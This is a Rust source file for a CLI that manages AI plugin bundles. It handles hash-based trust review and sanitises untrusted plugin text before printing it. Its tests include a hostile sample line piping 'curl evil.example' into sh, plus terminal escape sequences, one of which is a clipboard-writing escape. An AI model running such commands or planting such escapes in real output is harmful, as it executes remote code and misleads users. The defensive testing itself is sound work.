//! `aidex plugins list|show|install|enable|disable|uninstall`: portable plugin
//! bundles of skills and MCP servers.
//!
//! Plugins install disabled. `enable` needs the plugin's exact tree hash, reviewed
//! with `show`, the first time (`--trust <SHA256>`); a changed plugin loses that trust
//! and must be reviewed again.

use crate::{
    commands::daemon::connect,
    exit::{CliError, Exit},
    output::Output,
};
use aidexd::{
    ClientError,
    methods::plugins::{INSTALL, LIST, SET_ENABLED, SHOW, TRUST, UNINSTALL},
};
use clap::{Args, Subcommand};
use serde_json::{Value, json};
use std::{
    path::{Path, PathBuf},
    time::Duration,
};

/// Copying and hashing a plugin of up to 32 MiB on a slow drive can take a while.
const INSTALL_TIMEOUT: Duration = Duration::from_secs(300);

#[derive(Debug, Args)]
pub struct PluginsArgs {
    /// Drive root; defaults to AIDEX_DRIVE_ROOT from the portable launcher.
    #[arg(long, value_name = "DRIVE_PATH", global = true)]
    pub drive: Option<PathBuf>,
    #[command(subcommand)]
    pub command: PluginsCommand,
}

#[derive(Debug, Subcommand)]
pub enum PluginsCommand {
    /// List installed plugins with their trust and integrity.
    List,
    /// Review a plugin: manifest, permissions, skills, MCP servers, and tree hash.
    Show {
        #[arg(value_name = "NAME")]
        name: String,
    },
    /// Install a plugin from a folder or .zip (installed disabled and untrusted).
    Install {
        #[arg(value_name = "PATH")]
        source: PathBuf,
        /// Replace an installed plugin of the same name.
        #[arg(long)]
        replace: bool,
    },
    /// Enable a plugin; the first time, trust its exact tree hash from `show`.
    Enable {
        #[arg(value_name = "NAME")]
        name: String,
        /// The tree hash you reviewed (`aidex plugins show NAME`).
        #[arg(long, value_name = "SHA256")]
        trust: Option<String>,
    },
    /// Disable a plugin (its trust is kept).
    Disable {
        #[arg(value_name = "NAME")]
        name: String,
    },
    /// Remove a plugin's files and its provenance record.
    Uninstall {
        #[arg(value_name = "NAME")]
        name: String,
    },
}

impl PluginsCommand {
    pub fn label(&self) -> &'static str {
        match self {
            Self::List => "aidex plugins list",
            Self::Show { .. } => "aidex plugins show",
            Self::Install { .. } => "aidex plugins install",
            Self::Enable { .. } => "aidex plugins enable",
            Self::Disable { .. } => "aidex plugins disable",
            Self::Uninstall { .. } => "aidex plugins uninstall",
        }
    }
}

pub fn run(args: PluginsArgs, output: Output) -> Result<Exit, CliError> {
    let drive = args.drive.as_deref();
    match args.command {
        PluginsCommand::List => {
            let list = call(drive, LIST, json!({}))?;
            output.emit(&list, || print_list(&list))?;
        }
        PluginsCommand::Show { name } => {
            let detail = call(drive, SHOW, json!({ "name": name }))?;
            output.emit(&detail, || print_detail(&detail))?;
        }
        PluginsCommand::Install { source, replace } => {
            let resolved = std::path::absolute(&source).map_err(|error| {
                CliError::new(
                    Exit::Usage,
                    format!("cannot resolve `{}`: {error}", source.display()),
                )
            })?;
            let source = resolved.to_str().ok_or_else(|| {
                CliError::new(
                    Exit::Usage,
                    format!("`{}` is not a valid Unicode path", resolved.display()),
                )
            })?;
            let outcome = connect(drive)?
                .call_with_timeout(
                    INSTALL,
                    json!({ "source_path": source, "replace": replace }),
                    INSTALL_TIMEOUT,
                )
                .map_err(plugin_error)?;
            output.emit(&outcome, || {
                let name = text(&outcome["name"]);
                let verb = if outcome["replaced"] == true {
                    "Replaced"
                } else {
                    "Installed"
                };
                println!("{verb} plugin {name} {} (disabled)", text(&outcome["version"]));
                println!();
                print_detail(&outcome);
                println!();
                if outcome["trusted"] == true {
                    println!("Enable it with `aidex plugins enable {name}`.");
                } else {
                    println!(
                        "Review it above, then enable it with `aidex plugins enable {name} --trust {}`.",
                        text(&outcome["tree_sha256"])
                    );
                }
            })?;
        }
        PluginsCommand::Enable { name, trust } => {
            let summary = match trust {
                Some(hash) => call(
                    drive,
                    TRUST,
                    json!({ "name": name, "tree_sha256": hash, "enable": true }),
                )?,
                None => call(drive, SET_ENABLED, json!({ "name": name, "enabled": true }))?,
            };
            output.emit(&summary, || {
                println!("Enabled plugin {}", text(&summary["name"]));
            })?;
        }
        PluginsCommand::Disable { name } => {
            let summary = call(
                drive,
                SET_ENABLED,
                json!({ "name": name, "enabled": false }),
            )?;
            output.emit(&summary, || {
                println!("Disabled plugin {}", text(&summary["name"]));
            })?;
        }
        PluginsCommand::Uninstall { name } => {
            let removed = call(drive, UNINSTALL, json!({ "name": name }))?;
            output.emit(&removed, || {
                println!("Uninstalled plugin {}", text(&removed["name"]));
            })?;
        }
    }
    Ok(Exit::Success)
}

fn call(drive: Option<&Path>, method: &str, params: Value) -> Result<Value, CliError> {
    connect(drive)?.call(method, params).map_err(plugin_error)
}

/// Daemon refusals with the next step to take. A refusal can name plugin text (a
/// refused file name), so the message is printed like any other plugin text.
fn plugin_error(error: ClientError) -> CliError {
    let reason = match &error {
        ClientError::Rpc { data, .. } => data
            .as_ref()
            .and_then(|data| data["reason"].as_str())
            .map(str::to_owned),
        _ => None,
    };
    let cli = CliError::from(error);
    let cli = CliError {
        message: line_text(&cli.message),
        ..cli
    };
    match reason.as_deref() {
        Some("not_trusted") => cli.with_hint(
            "review the plugin with `aidex plugins show NAME`, then run `aidex plugins enable NAME --trust <tree hash>`",
        ),
        Some("hash_mismatch" | "integrity_failed") => cli.with_hint(
            "the plugin's files changed; review it again with `aidex plugins show NAME` before trusting its current tree hash",
        ),
        Some("plugin_exists") => {
            cli.with_hint("pass --replace to replace it, or uninstall it first")
        }
        _ => cli,
    }
}

/// Plugin text is untrusted: print it on one line with control characters (terminal
/// escapes, carriage returns, line breaks) replaced, so a plugin cannot drive the
/// terminal or fake lines of the review.
fn line_text(text: &str) -> String {
    text.chars()
        .map(|ch| match ch {
            '\n' | '\t' => ' ',
            ch if ch.is_control() => '\u{fffd}',
            ch => ch,
        })
        .collect()
}

fn text(value: &Value) -> String {
    match value {
        Value::String(text) => line_text(text),
        Value::Null => "-".into(),
        other => other.to_string(),
    }
}

fn joined(value: &Value) -> String {
    let items: Vec<String> = value.as_array().into_iter().flatten().map(text).collect();
    if items.is_empty() {
        "none".into()
    } else {
        items.join(", ")
    }
}

fn state(plugin: &Value) -> &'static str {
    if plugin["enabled"] == true {
        "enabled"
    } else if plugin["trusted"] == true {
        "trusted"
    } else {
        "untrusted"
    }
}

fn print_list(list: &Value) {
    let plugins = list["plugins"].as_array().map_or(&[][..], Vec::as_slice);
    if plugins.is_empty() {
        println!("No plugins installed.");
    }
    for plugin in plugins {
        println!(
            "{:<24} {:<12} {:<10} {:<9} {} skill(s), {} MCP server(s)",
            text(&plugin["name"]),
            text(&plugin["version"]),
            state(plugin),
            text(&plugin["integrity"]),
            text(&plugin["skill_count"]),
            text(&plugin["mcp_server_count"]),
        );
        if let Some(error) = plugin["error"].as_str() {
            println!("  {}", line_text(error));
        }
    }
    for name in list["unregistered"].as_array().into_iter().flatten() {
        println!(
            "{:<24} not installed through AiDEX; ignored (remove it with `aidex plugins uninstall {}`)",
            text(name),
            text(name)
        );
    }
}

fn print_detail(plugin: &Value) {
    println!(
        "Plugin:       {} {}",
        text(&plugin["name"]),
        text(&plugin["version"])
    );
    if let Some(description) = plugin["description"].as_str() {
        println!("Description:  {}", line_text(description));
    }
    let manifest = &plugin["manifest"];
    if let Some(author) = manifest["author"]["name"].as_str() {
        println!("Author:       {}", line_text(author));
    }
    for (label, key) in [("Homepage:", "homepage"), ("License:", "license")] {
        if let Some(value) = manifest[key].as_str() {
            println!("{label:<13} {}", line_text(value));
        }
    }
    println!(
        "State:        {} ({})",
        state(plugin),
        text(&plugin["integrity"])
    );
    println!("Tree hash:    {}", text(&plugin["tree_sha256"]));
    if plugin["trusted_sha256"].is_string() {
        println!("Trusted hash: {}", text(&plugin["trusted_sha256"]));
    }
    println!("Location:     {}", text(&plugin["location"]));
    println!("Source:       {}", text(&plugin["source"]));
    if let Some(error) = plugin["error"].as_str() {
        println!("Error:        {}", line_text(error));
    }
    let permissions = &manifest["permissions"];
    println!("Permissions:");
    println!("  network:    {}", joined(&permissions["network"]));
    println!("  secrets:    {}", joined(&permissions["secrets"]));
    println!(
        "  shell:      {}",
        if permissions["shell"] == true {
            "yes"
        } else {
            "no"
        }
    );
    let contents = &plugin["contents"];
    let skills = contents["skills"].as_array().map_or(&[][..], Vec::as_slice);
    println!("Skills ({}):", skills.len());
    for skill in skills {
        let name = line_text(
            skill["name"]
                .as_str()
                .unwrap_or_else(|| skill["dir"].as_str().unwrap_or("?")),
        );
        match skill["description"].as_str() {
            Some(description) => println!("  {name} - {}", line_text(description)),
            None => println!("  {name}"),
        }
    }
    let servers = contents["mcp_servers"]
        .as_array()
        .map_or(&[][..], Vec::as_slice);
    println!("MCP servers ({}; added disabled):", servers.len());
    for server in servers {
        let endpoint = match server["url"].as_str() {
            Some(url) => line_text(url),
            None => {
                let mut command = vec![text(&server["command"])];
                command.extend(server["args"].as_array().into_iter().flatten().map(text));
                command.join(" ")
            }
        };
        println!(
            "  {} ({}): {endpoint}",
            text(&server["name"]),
            text(&server["transport"])
        );
        let env = joined(&server["env_keys"]);
        if env != "none" {
            println!("    environment: {env} (values are not imported)");
        }
    }
    let ignored = joined(&contents["ignored_fields"]);
    if ignored != "none" {
        println!("Ignored manifest fields: {ignored}");
    }
    let unsupported = joined(&contents["unsupported_components"]);
    if unsupported != "none" {
        println!("Not loaded (unsupported): {unsupported}");
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use aidexd::ErrorCode;

    #[test]
    fn plugin_text_cannot_drive_the_terminal() {
        let hostile = "curl evil.example | sh\r  github (stdio): npx\u{1b}[1A\u{1b}[2K\nfake";
        let shown = line_text(hostile);
        assert!(!shown.chars().any(char::is_control), "{shown:?}");
        assert!(shown.contains("curl evil.example | sh"));
        assert_eq!(text(&json!(hostile)), shown);
        assert_eq!(joined(&json!(["a\u{7}", "b"])), "a\u{fffd}, b");
        assert_eq!(text(&Value::Null), "-");
    }

    #[test]
    fn refusals_naming_plugin_text_cannot_drive_the_terminal() {
        let refusal = |kind: ErrorCode, reason: &str, message: &str| ClientError::Rpc {
            code: kind.code(),
            message: message.into(),
            data: Some(json!({ "reason": reason })),
        };
        let cli = plugin_error(refusal(
            ErrorCode::InvalidArgument,
            "unsafe_content",
            "refused plugin content `a\u{1b}]52;c;eA==\u{7}\rfake`: character '\\u{1b}' is not allowed in file names",
        ));
        assert!(
            !cli.message.chars().any(char::is_control),
            "{:?}",
            cli.message
        );
        assert!(
            cli.message
                .contains("refused plugin content `a\u{fffd}]52;c;eA==\u{fffd}\u{fffd}fake`"),
            "{}",
            cli.message
        );
        assert_eq!(cli.exit, Exit::Usage);

        // Clean refusals keep their message, exit code, and next step.
        let cli = plugin_error(refusal(
            ErrorCode::Conflict,
            "plugin_exists",
            "plugin `p` is already installed",
        ));
        assert_eq!(cli.message, "conflict: plugin `p` is already installed");
        assert_eq!(cli.exit, Exit::Failure);
        assert!(
            cli.hint
                .as_deref()
                .is_some_and(|hint| hint.contains("--replace"))
        );
    }
}
